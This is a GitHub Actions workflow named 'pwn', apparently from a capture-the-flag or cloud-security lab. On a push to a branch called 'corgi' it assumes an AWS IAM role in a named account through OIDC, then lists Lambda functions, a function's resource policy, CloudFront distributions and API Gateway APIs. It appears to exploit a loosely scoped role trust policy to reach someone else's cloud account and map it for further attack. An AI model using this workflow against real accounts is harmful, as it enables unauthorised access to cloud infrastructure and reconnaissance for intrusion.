name: pwn
on:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  assume:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: recheck lambda + api
        if: always()
        run: |
          aws lambda list-functions
          aws lambda get-policy --function-name nslookupv2 || echo "function renamed or gone"
          aws cloudfront list-distributions
          aws apigateway get-rest-apis 2>&1 || echo "no apigateway read perms"
